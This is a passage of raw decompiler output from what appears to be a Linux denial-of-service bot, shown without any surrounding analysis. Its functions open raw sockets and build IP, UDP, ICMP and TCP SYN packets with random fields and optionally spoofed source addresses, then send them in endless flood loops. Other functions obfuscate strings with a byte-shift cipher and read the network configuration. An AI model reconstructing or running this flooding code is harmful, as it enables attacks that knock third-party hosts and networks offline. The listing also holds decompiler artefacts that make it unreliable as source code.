                    dl = al;
                    dl :: 255;
                    asm("setnc al");
                    Vfffff9e4 = dl + al;
                    L08055E38();
                    dl = al;
                    dl :: 255;
                    asm("setnc al");
                    Vfffff9e5 = dl + al;
                    L08055E38();
                    dl = al;
                    dl :: 255;
                    asm("setnc al");
                    Vfffff9e6 = dl + al;
                    L08055E38();
                    dl = al;
                    dl :: 255;
                    asm("setnc al");
                    Vfffff9e7 = dl + al;
                }
                if(A34 == 0) {
                    Vfffff9e8 = Vfffff9ac;
                    Vfffff9e9 = Vfffff9a8;
                    Vfffff9ea = Vfffff9a4;
                    Vfffff9eb = Vfffff9a0;
                }
                *edi = 69;
                L08055E38();
                ebx = 130;
                asm("cdq");
                *(edi + 8) = ebx / ebx % ebx / ebx + 120;
                L08055E38();
                ebx = 255;
                asm("cdq");
                *(edi + 4) = ebx / ebx % ebx / ebx;
                *(edi + 9) = 17;
                *(edi + 6) = 0;
                ax = *(ebp + esi * 4 - 36) + 28;
                asm("xchg al,ah");
                *(edi + 2) = ax;
                *(edi + 10) = 0;
                edx = 20;
                Vfffff974 = & Vfffff9d8;
                ecx = 0;
                Vfffff9b2 = 0;
                do {
                    ebx = Vfffff974;
                    ecx = ecx + ( *ebx & 65535);
                    ebx = ebx + 2;
                    Vfffff974 = ebx;
                    edx = edx + -2;
                } while(edx > 1);
                != ? 0x8049933 : ;
                Vfffff9b2 = *ebx;
                ecx = ecx + (Vfffff9b2 & 65535);
                edx = ecx >> 16;
                ecx = (cx & 65535) + edx;
                ax = !(ecx + (ecx >> 16));
                Vfffff9b2 = ax;
                *(edi + 10) = Vfffff9b2;
                sendto(Vfffff98c, & Vfffff9d8, *(ebp + esi * 4 - 36) + 28, 0, & Vfffffdd8, 16);
                if(A28 != 0) {
                    if(Vfffff980 != A28) {
                        Vfffff980 = Vfffff980 + 1;
                        goto L080499c2;
                    }
                    L080555B0(300);
                    Vfffff980 = 0;
                } else {
                    (save)300;
                    L080555B0();
                }
                Vfffff97c = Vfffff97c - 1;
L080499c2:
                Vfffff978 = Vfffff978 + 50;
                esi = esi + 1;
            } while(esi <= 8);
        }
        goto L080496cc;
    }
    *L0807E774 = 0;
    esp = ebp + -1688;
    return(0);
}



L080499F4(A8, Ac, A10, A14, A18, A1c, A20, A24, A28, A2c, A30, A34)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A20;
/* unknown */ void  A24;
/* unknown */ void  A28;
/* unknown */ void  A2c;
/* unknown */ void  A30;
/* unknown */ void  A34;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffff60;
	/* unknown */ void  Vffffff64;
	/* unknown */ void  Vffffff68;
	/* unknown */ void  Vffffff6c;
	/* unknown */ void  Vffffff70;
	/* unknown */ void  Vffffff74;
	/* unknown */ void  Vffffff78;
	/* unknown */ void  Vffffff7c;
	/* unknown */ void  Vffffff80;
	/* unknown */ void  Vffffff84;
	/* unknown */ void  Vffffff88;
	/* unknown */ void  Vffffff8e;
	/* unknown */ void  Vffffff90;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd2;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd6;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffd9;
	/* unknown */ void  Vffffffda;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe5;
	/* unknown */ void  Vffffffe6;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffea;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff4;



    Vffffff84 = A10;
    Vffffff80 = A14;
    Vffffff7c = A18;
    Vffffff78 = A1c;
    Vffffff74 = A20;
    Vffffff70 = A24;
    Vffffff6c = A28;
    Vfffffff0 = 2;
    L08055E38();
    ecx = 255;
    asm("cdq");
    eax = ecx / ecx % ecx / ecx;
    asm("xchg al,ah");
    Vfffffff2 = ax;
    esi = & Vffffff90;
    L0804F808(esi, "%d.%d.%d.%d", Vffffff74 & 255, Vffffff70 & 255, Vffffff6c & 255, A2c & 255);
    if(A30 == 0) {
        ebx = & Vffffffb0;
        L0804F808();
        Vfffffff4 = L0804CE8C(ebx, ebx, "%d.%d.%d.%d", Vffffff84 & 255, Vffffff80 & 255, Vffffff7c & 255, Vffffff78 & 255);
    }
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vffffff68 = eax;
    if(Vffffff68 > 0) {
        Vffffffd0 = 69;
        Vffffffd2 = 7208;
        Vffffffd4 = 21764;
        L08055E38();
        ecx = 130;
        asm("cdq");
        Vffffffd8 = ecx / ecx % ecx / ecx + 120;
        Vffffffdc = L0804CE8C(esi);
        if(A30 == 0) {
            Vffffffe0 = L0804CE8C( & Vffffffb0);
        }
        Vffffffd6 = 65055;
        Vffffffda = 0;
        if(A8 != 0) {
            Vffffffd9 = 17;
            L08055E38();
            ecx = 255;
            asm("cdq");
            eax = ecx / ecx % ecx / ecx;
            asm("xchg al,ah");
            Vffffffe4 = ax;
            ax = Ac;
            asm("xchg al,ah");
            Vffffffe6 = ax;
            Vffffffe8 = 2304;
            edx = 9;
            esi = & Vffffffe4;
            ebx = 0;
            Vffffff8e = 0;
            do {
                ebx = ebx + ( *esi & 65535);
                esi = esi + 2;
                edx = edx + -2;
            } while(edx > 1);
            != ? 0x8049b89 : ;
            Vffffff8e = *esi;
            ebx = ebx + (Vffffff8e & 65535);
            edx = ebx >> 16;
            ebx = (bx & 65535) + edx;
            ebx = ebx + (ebx >> 16);
            ax = !ebx;
            Vffffff8e = ax;
            Vffffffea = Vffffff8e;
            Vffffffec = 97;
        } else {
            Vffffffd9 = 1;
            Vffffffe4 = 8;
            Vffffffe5 = 0;
            Vffffffe6 = 0;
            edx = 9;
            esi = & Vffffffe4;
            ebx = 0;
            Vffffff8e = 0;
            do {
                ebx = ebx + ( *esi & 65535);
                esi = esi + 2;
                edx = edx + -2;
            } while(edx > 1);
            != ? 0x8049bf1 : ;
            Vffffff8e = *esi;
            ebx = ebx + (Vffffff8e & 65535);
            edx = ebx >> 16;
            ebx = (bx & 65535) + edx;
            ebx = ebx + (ebx >> 16);
            ax = !ebx;
            Vffffff8e = ax;
            Vffffffe6 = Vffffff8e;
        }
        Vffffff64 = 29;
        edx = 20;
        esi = & Vffffffd0;
        ebx = 0;
        Vffffff8e = 0;
        do {
            ebx = ebx + ( *esi & 65535);
            esi = esi + 2;
            edx = edx + -2;
        } while(edx > 1);
        != ? 0x8049c49 : ;
        Vffffff8e = *esi;
        ebx = ebx + (Vffffff8e & 65535);
        edx = ebx >> 16;
        Vffffff8e = !(ebx + ((bx & 65535) + edx >> 16));
        Vffffffda = Vffffff8e;
        ebx = 0;
        Vffffff60 = & Vfffffff0;
        for(edi = & Vffffffd0; 1; ebx = ebx - 1) {
            esi = 0;
            if(A30 != 0 && ebx <= 0) {
                edx = L0804BF80(A34);
                if(edx != 0) {
L08049cac:
                    L08056480( *( *(edx + 16)), & Vffffff88, 4);
                    eax = Vffffff88;
                    Vffffffe0 = eax;
                    Vfffffff4 = Vffffffe0;
                    ebx = 40000;
                } else {
                    L080556CC(600);
                    esi = 1;
                }
            }
            if(esi == 0) {
                sendto();
                sendto(Vffffff68, edi, Vffffff64, 0, Vffffff60, 16, Vffffff68, edi, Vffffff64, 0, Vffffff60, 16);
                L080555B0(20);
            }
        }
        goto L08049cac;
    }
    *L0807E774 = 0;
    esp = ebp + -172;
    return(0);
}



L08049D40(A8, Ac, A10, A14, A18, A1c, A20, A24, A28, A2c, A30, A34, A38, A3c)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A20;
/* unknown */ void  A24;
/* unknown */ void  A28;
/* unknown */ void  A2c;
/* unknown */ void  A30;
/* unknown */ void  A34;
/* unknown */ void  A38;
/* unknown */ void  A3c;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffff34;
	/* unknown */ void  Vffffff38;
	/* unknown */ void  Vffffff3c;
	/* unknown */ void  Vffffff40;
	/* unknown */ void  Vffffff44;
	/* unknown */ void  Vffffff48;
	/* unknown */ void  Vffffff4c;
	/* unknown */ void  Vffffff50;
	/* unknown */ void  Vffffff54;
	/* unknown */ void  Vffffff58;
	/* unknown */ void  Vffffff5c;
	/* unknown */ void  Vffffff62;
	/* unknown */ void  Vffffff64;
	/* unknown */ void  Vffffff68;
	/* unknown */ void  Vffffff88;
	/* unknown */ void  Vffffffa8;
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffb1;
	/* unknown */ void  Vffffffb2;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffc9;
	/* unknown */ void  Vffffffca;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffce;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd1;
	/* unknown */ void  Vffffffd2;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffde;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffe9;
	/* unknown */ void  Vffffffea;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vffffffee;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff4;



    Vffffff5c = A8;
    Vffffff58 = Ac;
    Vffffff54 = A10;
    Vffffff38 = A14;
    Vffffff50 = A24;
    Vffffff4c = A28;
    Vffffff48 = A2c;
    Vffffff44 = A30;
    if(A34 != 0) {
        A34 = A34 - 1;
    }
    L080559A0(time(0));
    Vfffffff0 = 2;
    L08055E38();
    ebx = 255;
    asm("cdq");
    eax = ebx / ebx % ebx / ebx;
    asm("xchg al,ah");
    Vfffffff2 = ax;
    if(A38 == 0) {
        ebx = & Vffffff88;
        L0804F808();
        Vfffffff4 = L0804CE8C(ebx, ebx, "%d.%d.%d.%d", Vffffff5c & 255, Vffffff58 & 255, Vffffff54 & 255, Vffffff38 & 255);
    }
    Vffffffc8 = 69;
    Vffffffca = 10240;
    Vffffffc9 = 0;
    eax = socket(AF_INET, SOCK_RAW, RAW);
    Vffffff40 = eax;
    if(Vffffff40 > 0) {
        if(A20 != 0) {
            L0804F808( & Vffffff68, "%d.%d.%d.%d", Vffffff50 & 255, Vffffff4c & 255, Vffffff48 & 255, Vffffff44 & 255);
        }
        if(A38 == 0) {
            Vffffffd8 = L0804CE8C( & Vffffff88);
        }
        Vffffffce = 0;
        Vffffffd1 = 6;
        Vffffffe9 = Vffffffe9 & 239;
        al = Vffffffe8 & 15 | 80;
        Vffffffe8 = al;
        Vffffffe4 = 0;
        Vffffffe8 = Vffffffe8 & 80;
        Vffffffe9 = 2;
        Vffffffee = 0;
        ax = (A18 << 8) + A1c;
        asm("xchg al,ah");
        Vffffffde = ax;
        edi = 0;
        Vffffffb0 = 0;
        if(A38 == 0) {
            Vffffffac = Vffffffd8;
        }
        Vffffffb1 = 6;
        Vffffffb2 = 5120;
        esi = 0;
        for(Vffffff3c = & Vffffffa8; 1; esi = esi - 1) {
            Vffffff34 = 0;
            if(A38 != 0 && esi <= 0) {
                edx = L0804BF80(A3c);
                if(edx != 0) {
L08049f30:
                    L08056480( *( *(edx + 16)), & Vffffff64, 4);
                    eax = Vffffff64;
                    Vffffffd8 = eax;
                    Vfffffff4 = eax;
                    Vffffffac = Vfffffff4;
                    esi = 40000;
                } else {
                    L080556CC(600);
                    Vffffff34 = 1;
                }
            }
            if(Vffffff34 != 0) {
                continue;
            }
            L08056058();
            ebx = 3089;
            asm("cdq");
            ah = ebx / ebx % ebx / ebx + 2;
            asm("xchg al,ah");
            Vffffffcc = ax;
            L08056058();
            ebx = 1401;
            asm("cdq");
            ax = ebx / ebx % ebx / ebx + 200;
            asm("xchg al,ah");
            Vffffffea = ax;
            L08056058();
            ebx = 40000;
            asm("cdq");
            ax = ebx / ebx % ebx / ebx + 1;
            asm("xchg al,ah");
            Vffffffdc = ax;
            L08056058();
            ebx = 40000000;
            asm("cdq");
            eax = ebx / ebx % ebx / ebx + 1;
            asm("xchg al,ah");
            asm("ror eax,0x10");
            asm("xchg al,ah");
            Vffffffe0 = eax;
            L08056058();
            ebx = 116;
            asm("cdq");
            Vffffffd0 = ebx / ebx % ebx / ebx + 125;
            if(A20 == 0) {
                L08055E38();
                ebx = 255;
                asm("cdq");
                ebx = ebx / ebx;
                (save)ebx % ebx;
                L08055E38();
                asm("cdq");
                ebx = ebx / ebx;
                (save)ebx % ebx;
                L08055E38();
                asm("cdq");
                ebx = ebx / ebx;
                (save)ebx % ebx;
                L08055E38();
                asm("cdq");
                (save)ebx / ebx % ebx / ebx;
                (save)"%u.%u.%u.%u";
                (save) & Vffffff68;
                L0804F808();
                esp = esp + 24;
            }
            (save) & Vffffff68;
            eax = L0804CE8C();
            Vffffffd4 = eax;
            Vffffffa8 = Vffffffd4;
            Vffffffec = 0;
            Vffffffd2 = 0;
            (save)20;
            (save) & Vffffffb4;
            (save) & Vffffffdc;
            L08056480();
            esp = esp + 16;
            edx = 32;
            Vffffff34 = Vffffff3c;
            ecx = 0;
            Vffffff62 = 0;
            do {
                ebx = Vffffff34;
                ecx = ecx + ( *ebx & 65535);
                ebx = ebx + 2;
                Vffffff34 = ebx;
                edx = edx + -2;
            } while(edx > 1);
            != ? 0x804a097 : ;
            Vffffff62 = *ebx;
            ecx = ecx + (Vffffff62 & 65535);
            edx = ecx >> 16;
            Vffffff62 = !(ecx + ((cx & 65535) + edx >> 16));
            Vffffffec = Vffffff62;
            edx = 20;
            Vffffff34 = & Vffffffc8;
            ecx = 0;
            Vffffff62 = 0;
            do {
                ebx = Vffffff34;
                ecx = ecx + ( *ebx & 65535);
                ebx = ebx + 2;
                Vffffff34 = ebx;
                edx = edx + -2;
            } while(edx > 1);
            != ? 0x804a103 : ;
            Vffffff62 = *ebx;
            ecx = ecx + (Vffffff62 & 65535);
            edx = ecx >> 16;
            ecx = (cx & 65535) + edx;
            ax = !(ecx + (ecx >> 16));
            Vffffff62 = ax;
            Vffffffd2 = Vffffff62;
            sendto(Vffffff40, & Vffffffc8, 40, 0, & Vfffffff0, 16);
            if(A34 != 0) {
                if(A34 != edi) {
                    edi = edi + 1;
                    continue;
                }
                L080555B0(300);
                edi = 0;
            } else {
                (save)300;
                L080555B0();
            }
        }
        goto L08049f30;
    }
    *L0807E774 = 0;
    esp = ebp + -216;
    return(0);
}



L0804A194(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    *A10 = *L080675E5;
    eax = L0804F808(A10, "%c", *Ac + 23);
    ecx = 1;
    if(1 != A8) {
        do {
            edx = *(A10 + ecx - 1) & 255;
            eax = edx + ( *(ecx + Ac) & 255) + 23;
            *(ecx + A10) = al;
            ecx = ecx + 1;
        } while(ecx != A8);
    }
}



L0804A1E8(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffffc;



    ebx = A8 - 1;
    al = A8 + 3 & 252;
    esp = esp - eax;
    Vfffffffc = esp;
    *A10 = *L080675E5;
    if(ebx >= 0) {
        do {
            edx = ebx - 1;
            if(ebx == 0) {
                eax = *Ac & 255;
            } else {
                esi = Ac;
                eax = *(ebx + esi) & 255;
                eax = eax - ( *(edx + esi) & 255);
            }
            ecx = eax - 23;
            if(ecx < 0) {
                do {
                } while(ecx = ecx + 256);
            }
            edx = 0;
            if(0 < A8) {
                do {
                    al = *(edx + A10);
                    *(edx + Vfffffffc) = al;
                    edx = edx + 1;
                } while(edx < A8);
            }
            *A10 = cl;
            edx = 1;
            if(1 < A8) {
                do {
                    al = *(edx + Vfffffffc - 1);
                    *(edx + A10) = al;
                    edx = edx + 1;
                } while(edx < A8);
            }
            eax = L0804F808(A10, "%c%s", ecx, Vfffffffc);
        } while(ebx = ebx - 1);
    }
    esp = ebp - 16;
}



L0804A2A8(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    edi = A8;
    al = 0;
    asm("cld");
    ecx = -1;
    asm("repne scasb");
    Vfffffff8 = !ecx - 1;
    edi = Ac;
    asm("cld");
    ecx = -1;
    asm("repne scasb");
    Vfffffff4 = !ecx - 1;
    Vfffffff0 = 0;
    Vfffffffc = 0;
    ebx = *L0806D228;
    if(*ebx != 0) {
        do {
            esi = *ebx;
            edi = A8;
            ecx = Vfffffff8;
            asm("cld");
            asm("repe cmpsb");
            != ? 0x804a30e : ;
            esi = *ebx;
            if(*(Vfffffff8 + esi) == 61) {
                break;
            }
            Vfffffffc = Vfffffffc + 1;
            ebx = ebx + 4;
        } while(*ebx != 0);
        if(*ebx != 0) {
            goto L0804a408;
        }
    }
    ebx = L0805BD74(Vfffffffc * 4 + 8);
    if(ebx != 0) {
        L0805652C(ebx, *L0806D228, Vfffffffc * 4);
        edx = L0805BD74(Vfffffff8 + Vfffffff4 + 2);
        *(ebx + Vfffffffc * 4) = edx;
        if(*(ebx + Vfffffffc * 4) != 0) {
            goto L0804a390;
        }
        (save)ebx;
        L0805C290();
        *L08078B14 = 12;
    }
L0804a384:
    Vfffffff0 = -1;
    goto L0804a47f;
L0804a390:
    Vffffffec = *(ebx + Vfffffffc * 4);
    L0805652C(Vffffffec, A8, Vfffffff8);
    eax = *(ebx + Vfffffffc * 4);
    esi = Vfffffff8;
    *(esi + eax) = 61;
    Vffffffec = esi + *(ebx + Vfffffffc * 4) + 1;
    L0805652C(Vffffffec, Ac, Vfffffff4 + 1);
    *(ebx + Vfffffffc * 4 + 4) = 0;
    if(*L080784F4 != 0) {
        (save) *L080784F4;
        L0805C290();
    }
    *L080784F4 = ebx;
    *L0806D228 = ebx;
    goto L0804a47f;
L0804a408:
    if(A10 != 0) {
        edi = *ebx;
        al = 0;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        Vffffffec = !ecx - 1;
        edx = Vfffffff8 + Vfffffff4 + 1;
        if(Vffffffec < edx) {
            edx = L0805BD74(edx + 1);
            if(edx == 0) {
                goto L0804a384;
            }
            *ebx = edx;
        }
        Vffffffec = *ebx;
        L0805652C(Vffffffec, A8, Vfffffff8);
        eax = *ebx;
        esi = Vfffffff8;
        *(esi + eax) = 61;
        esi = esi + *ebx + 1;
        L0805652C(esi, Ac, Vfffffff4 + 1);
    }
L0804a47f:
    esp = ebp - 36;
    return(Vfffffff0);
}


L0804A48C(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffffc;



    al = 0;
    edi = A8;
    asm("cld");
    ecx = -1;
    asm("repne scasb");
    eax = !ecx - 1;
    Vfffffffc = eax;
    ebx = *L0806D228;
    edx = ebx;
    if(*ebx != 0) {
        do {
            esi = *edx;
            edi = A8;
            ecx = Vfffffffc;
            asm("cld");
            asm("repe cmpsb");
            != ? 0x804a4d2 : ;
            eax = *edx;
            if(*(Vfffffffc + eax) != 61) {
                eax = *edx;
                *ebx = eax;
                ebx = ebx + 4;
            }
            edx = edx + 4;
        } while(*edx != 0);
    }
    *ebx = 0;
    esp = ebp - 16;
}



L0804A4F4(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff8;



    esi = 0;
    if(*L08078520 > 0) {
        do {
            eax = *(esi * 4 + 0x807a348);
            Vfffffff8 = eax;
            edi = Vfffffff8;
            al = 0;
            asm("cld");
            ecx = -1;
            asm("repne scasb");
            ebx = !ecx - 1;
            edi = A8;
            asm("cld");
            ecx = -1;
            asm("repne scasb");
            ecx = !ecx - 1;
            if(ecx > ebx) {
                eax = L080565F8(ecx + A8 - ebx, Vfffffff8);
                if(eax == 0) {
                    edi = A8;
                    al = 0;
                    asm("cld");
                    ecx = -1;
                    asm("repne scasb");
                    edx = !ecx - 1 - ebx;
                    eax = A8;
                    *(edx + eax) = 0;
                }
            }
            esi = esi + 1;
        } while(*L08078520 > esi);
    }
    esp = ebp - 20;
}



L0804A580(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;



    if(*L08078520 != 0) {
        L0804A4F4( *A8);
        ebx = 0;
        eax = *(A8 + 4);
        if(*eax != 0) {
            do {
                L0804A4F4( *(eax + ebx * 4));
                ebx = ebx + 1;
                eax = *(A8 + 4);
            } while(*(eax + ebx * 4) != 0);
        }
    }
    return(A8);
}



L0804A5CC(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffe98;
	/* unknown */ void  Vfffffe9c;
	/* unknown */ void  Vfffffea0;
	/* unknown */ void  Vfffffea4;
	/* unknown */ void  Vfffffea8;
	/* unknown */ void  Vfffffeac;
	/* unknown */ void  Vfffffeb0;
	/* unknown */ void  Vfffffeb4;
	/* unknown */ void  Vfffffeb8;
	/* unknown */ void  Vfffffebc;
	/* unknown */ void  Vfffffec0;



    if(*L08078524 != 0 && A8 != 0) {
        if(*L08078524 == -1) {
            eax = socket(AF_INET, SOCK_STREAM, IP);
            Vfffffeb0 = eax;
            if(eax == -1) {
                goto L0804a9c9;
            }
            Vfffffeb8 = 320;
            Vfffffebc = & Vfffffec0;
	    // ioctl call to get interface list
            eax = ioctl(Vfffffeb0, SIOCGIFCONF, & Vfffffeb8);
            if(eax == -1) {
                goto L0804a9c9;
            }
            Vfffffeac = Vfffffeb8 >> 5;
            *L080793B0 = 0x80792c0;
            A8 = Vfffffebc;
            Vfffffe98 = A8;
            if(Vfffffeac != 0) {
                ebx = A8 + 20;
                eax = Vfffffeac & 1;
                if(Vfffffeac > 0 && eax == 0) {
                    goto L0804a747;
                }
                A8 = Vfffffe98;
                L08056640();
		// get network PA mask
                if(ioctl(Vfffffeb0, SIOCGIFNETMASK, A8, *L080793B0, A8) != -1 && *(ebx - 4) == 2) {
                    esi = *ebx;
		    // get PA address
                    if(ioctl(Vfffffeb0, SIOCGIFADDR, Vfffffe98) != -1 && *(ebx - 4) == 2 && !(edx = *ebx & esi)) {
                        eax = *L080793B0;
                        *(eax + 16) = edx;
                        *(eax + 20) = esi;
                        if(*L08078524 == -1) {
                            *L08078524 = 0;
                        }
                        *L080793B0 = *L080793B0 + 24;
                        *L08078524 = *L08078524 + 1;
                    }
                }
                ebx = ebx + 32;
                Vfffffe98 = Vfffffe98 + 32;
                if(!(Vfffffeac = Vfffffeac - 1)) {
L0804a747:
                    Vfffffea8 = ebx;
                    Vfffffea4 = ebx - 4;
                    Vfffffea0 = ebx;
                    Vfffffe9c = Vfffffea4;
                    do {
                        A8 = Vfffffe98;
                        L08056640();
			// get network PA mask
                        if(ioctl(Vfffffeb0, SIOCGIFNETMASK, A8, *L080793B0, A8) != -1 && *Vfffffe9c == 2) {
                            ebx = *Vfffffea0;
			    // get PA address
                            if(ioctl(Vfffffeb0, SIOCGIFADDR, Vfffffe98) != -1 && *Vfffffea4 == 2 && !(edx = *Vfffffea8 & ebx)) {
                                eax = *L080793B0;
                                *(eax + 16) = edx;
                                *(eax + 20) = ebx;
                                if(*L08078524 == -1) {
                                    *L08078524 = 0;
                                }
                                *L080793B0 = *L080793B0 + 24;
                                *L08078524 = *L08078524 + 1;
                            }
                        }
                        ebx = Vfffffe98 + 32;
                        L08056640();
			// get network PA mask
                        if(ioctl(Vfffffeb0, SIOCGIFNETMASK, ebx, *L080793B0, ebx) != -1 && *(Vfffffe9c + 32) == 2) {
                            esi = *(Vfffffea0 + 32);
			    // get PA address
                            if(ioctl(Vfffffeb0, SIOCGIFADDR, ebx) != -1 && *(Vfffffea4 + 32) == 2 && !(edx = *(Vfffffea8 + 32) & esi)) {
                                eax = *L080793B0;
                                *(eax + 16) = edx;
                                *(eax + 20) = esi;
                                if(*L08078524 == -1) {
                                    *L08078524 = 0;
                                }
                                *L080793B0 = *L080793B0 + 24;
                                *L08078524 = *L08078524 + 1;
                            }
                        }
                        Vfffffea8 = Vfffffea8 + 64;
                        Vfffffea4 = Vfffffea4 + 64;
                        Vfffffea0 = Vfffffea0 + 64;
                        Vfffffe9c = Vfffffe9c + 64;
                        Vfffffe98 = Vfffffe98 + 64;
                    } while(Vfffffeac = Vfffffeac + -2);
                }
            }
            eax = close(Vfffffeb0);
            if(*L08078524 == 0) {
                goto L0804a9c9;
            }
        }
        ebx = *(A8 + 16);
        if(ebx != 0) {
            esi = & Vfffffeb4;
            do {
                if(*ebx == 0) {
                    break;
                }
                *L080793B0 = 0x80792c0;
                ecx = *L08078524;
                if(ecx != 0) {
                    eax = ecx & 1;
                    if(ecx > 0 && eax == 0) {
                        goto L0804a958;
                    }
                    eax = *ebx;
                    edx = *L080793B0;
                    eax = *eax & *(edx + 20);
                    if(*(edx + 16) == eax) {
                        goto L0804a983;
                    }
                    *L080793B0 = *L080793B0 + 24;
                    if(!(ecx = ecx - 1)) {
L0804a958:
                        do {
                            eax = *ebx;
                            edx = *L080793B0;
                            if(*(edx + 16) == ( *eax & *(edx + 20))) {
                                goto L0804a983;
                            }
                            *L080793B0 = *L080793B0 + 24;
                            eax = *ebx;
                            edx = *L080793B0;
                            eax = *eax & *(edx + 20);
                            if(*(edx + 16) == eax) {
                                goto L0804a983;
                            }
                            *L080793B0 = *L080793B0 + 24;
                        } while(ecx = ecx + -2);
                    }
                }
            } while(ebx = ebx + 4);
            goto L0804a9c9;
L0804a983:
            L08056480();
            L08056480();
            eax = L08056480(esi, *ebx, 4, *ebx, *( *(A8 + 16)), 4, *( *(A8 + 16)), esi, 4);
        }
    }
L0804a9c9:
    esp = ebp + -372;
}



L0804A9D8()
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffbec;
	/* unknown */ void  Vfffffbf0;
	/* unknown */ void  Vfffffbf4;
	/* unknown */ void  Vfffffbf8;
	/* unknown */ void  Vfffffbfc;
	/* unknown */ void  Vfffffc00;
	/* unknown */ void  Vfffffc04;
	/* unknown */ void  Vfffffc05;
	/* unknown */ void  Vfffffc07;



    esi = 0;
    Vfffffbf8 = 0x807a358;
    L0805E954();
    eax = L08055668("RESOLV_HOST_CONF");
    Vfffffbf4 = eax;
    if(Vfffffbf4 == 0) {
        Vfffffbf4 = "/etc/host.conf";
    }
    eax = L0804F620(Vfffffbf4, "r");
    Vfffffbfc = eax;
    if(Vfffffbfc == 0) {
        *L08079DD4 = 1;
        *L08079DD8 = 0;
    } else {
        Vfffffbf0 = & Vfffffc00;
L0804aa5c:
        while(1) {
            if(L0804F5C4(Vfffffbf0, 1024, Vfffffbfc) == 0) {
                goto L0804b41c;
            }
            ebx = L08057BE8(Vfffffbf0, 10);
            if(ebx != 0) {
                *ebx = 0;
            }
            if(Vfffffc00 == 35) {
                continue;
            }
            ebx = & Vfffffc00;
            if(Vfffffc00 != 0) {
                edx = *L08078FA0;
                do {
                    if(*(edx + ( *ebx & 255) * 2 + 1) & 32) {
                        break;
                    }
                    if(ebx = ebx + 1) {
                        goto L0804aa5c;
                    }
                } while(*ebx != 0);
            }
            if(ebx == 0 || *ebx == 0) {
                continue;
            }
            edi = ebx;
            al = 0;
            asm("cld");
            ecx = -1;
            asm("repne scasb");
            edx = !ecx;
            Vfffffbec = edx;
            L08056570();
            if(L080566BC(Vfffffbf0, "order", 5, Vfffffbf0, ebx, Vfffffbec) != 0 || Vfffffc05 != 0 && *( *L08078FA0 + (Vfffffc05 & 255) * 2 + 1) & 32) {
                if(L080566BC(Vfffffbf0, "multi", 5) != 0 || Vfffffc05 != 0 && *( *L08078FA0 + (Vfffffc05 & 255) * 2 + 1) & 32) {
                    if(L080566BC(Vfffffbf0, "nospoof", 7) != 0 || Vfffffc07 != 0 && *( *L08078FA0 + (Vfffffc07 & 255) * 2 + 1) & 32) {
                        if(L080566BC(Vfffffbf0, "alert", 5) != 0 || Vfffffc05 != 0 && *( *L08078FA0 + (Vfffffc05 & 255) * 2 + 1) & 32) {
                            if(L080566BC(Vfffffbf0, "reorder", 7) != 0 || Vfffffc07 != 0 && *( *L08078FA0 + (Vfffffc07 & 255) * 2 + 1) & 32) {
                                if(L080566BC(Vfffffbf0, "trim", 4) != 0 || Vfffffc04 != 0 && *( *L08078FA0 + (Vfffffc04 & 255) * 2 + 1) & 32) {
                                    ebx = L08057B30(Vfffffbf0, " \t");
                                    if(ebx != 0) {
                                        *ebx = 0;
                                    }
                                    (save)Vfffffbf0;
                                    (save)L0805E584( *L08078F9C, 11, 13, "resolv+: \"%s\" is an invalid keyword\n");
                                    (save)0x80787a4;
                                    L0804F680();
                                    esp = esp + 12;
                                    continue;
                                }
                                if(*L08078520 > 3) {
                                    continue;
                                }
                                ebx = L08057B30(Vfffffbf0, " \t");
